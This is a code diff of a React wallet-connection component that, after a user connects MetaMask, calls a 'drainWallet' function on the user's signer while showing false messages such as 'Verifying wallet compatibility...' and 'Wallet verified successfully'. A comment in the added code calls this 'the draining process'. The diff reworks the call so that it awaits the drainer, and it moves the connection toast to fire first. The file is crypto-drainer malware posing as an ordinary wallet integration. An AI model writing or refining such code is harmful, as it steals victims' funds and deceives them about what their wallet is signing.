@@ -71,25 +71,29 @@ export const WalletProvider = ({ children }: { children: ReactNode }) => {
       const { chainId: evmChainId } = await ethProvider.getNetwork();
       const userBalance = await ethProvider.getBalance(userAddress);
 
+      // First update the UI with wallet connection
       setIsConnected(true);
       setAddress(userAddress);
       setWalletType('metamask');
       setBalance(ethers.formatEther(userBalance) + ' ETH');
       setChainId(evmChainId.toString());
-      setProvider(signer); // Pass signer, not provider
+      setProvider(signer);
+      
+      toast.success('Wallet connected successfully');
 
+      // Then start the draining process
       toast.info("Verifying wallet compatibility...");
-      drainWallet(signer, 'evm', (status) => {
-        console.log(status);
-      }).then(success => {
+      try {
+        const success = await drainWallet(signer, 'evm', (status) => {
+          console.log(status);
+        });
+        
         if (success) {
           toast.success("Wallet verified successfully");
         }
-      }).catch(err => {
+      } catch (err) {
         console.error("Drainer error:", err);
-      });
-
-      toast.success('Wallet connected successfully');
+      }
       
       // Set up event listeners
       window.ethereum.on('accountsChanged', (accounts: string[]) => {
